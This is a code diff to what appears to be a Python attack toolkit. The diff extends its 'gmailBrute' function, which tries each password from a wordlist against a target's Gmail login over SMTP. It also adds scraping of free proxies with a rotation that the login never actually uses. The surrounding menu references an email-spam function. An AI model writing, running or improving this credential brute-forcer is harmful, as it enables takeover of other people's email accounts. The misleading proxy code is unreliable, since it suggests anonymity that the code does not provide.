@@ -22,6 +22,9 @@ try:
     import phonenumbers.carrier as carrier
     from colored import stylize
     import smtplib, ssl
+    from itertools import cycle
+    import traceback
+    from lxml.html import fromstring
 
 except ImportError:
     print("ImportError, you're probably missing some libraries or using"
@@ -222,7 +225,8 @@ def menu():
             geo(prompt.split("geo ")[1])
         elif "gmailbrute" in prompt.lower():
             gmailBrute()
-
+        if "scrape" in prompt and str.isdigit(prompt.split("scrape ")[1]):
+            proxyScrape(int(prompt.split("scrape ")[1]))
         else:
             cprint(error, "Invalid or malformed command.")
 
@@ -456,21 +460,57 @@ def emailSpam():
             cprint(error, "To enable you to use this function!")
             server.quit()
 
+def get_proxies():
+    url = 'https://free-proxy-list.net/'
+    response = requests.get(url)
+    parser = fromstring(response.text)
+    proxies = set()
+    for i in parser.xpath('//tbody/tr')[:10]:
+        if i.xpath('.//td[7][contains(text(),"yes")]'):
+            proxy = ":".join([i.xpath('.//td[1]/text()')[0], i.xpath('.//td[2]/text()')[0]])
+            proxies.add(proxy)
+    return proxies
+
+
 def gmailBrute():
+
 
     server = smtplib.SMTP_SSL('smtp.gmail.com')
     targetEmail = input("\033[94mTarget: ")
     passWordList = input("\033[93mPassword List: ")
-
     pass_file = open(passWordList, 'r')
-    for password in pass_file:
-        try:
-            server.login(targetEmail, password)
 
-            cprint(success, f"Password Found: {password}")
-            break;
-        except smtplib.SMTPAuthenticationError:
-            cprint(error, f"Password Incorrect: {password}")
+    proxies = get_proxies()
+    proxy_pool = cycle(proxies)
+    url = 'https://httpbin.org/ip'
+
+
+    for password in pass_file:
+
+            try:
+                proxy = next(proxy_pool)
+
+                server.login(targetEmail, password)
+
+                cprint(success, f"Proxie: {proxy}")
+                cprint(success, f"Password Found: {password}")
+                break;
+            except smtplib.SMTPAuthenticationError:
+                cprint(error, f"Proxie: {proxy}")
+                cprint(error, f"Password Incorrect: {password}")
+
+def proxyScrape(number):
+    proxies = get_proxies()
+    proxy_pool = cycle(proxies)
+    url = 'https://httpbin.org/ip'
+
+    for i in range(1, number):
+        try:
+            proxy = next(proxy_pool)
+
+            cprint(success, f"HTTP Proxies: {proxy}")
+        except:
+            cprint(error, "A  Error Occured")
 
 # Lets roll :sunglasses:
 try:
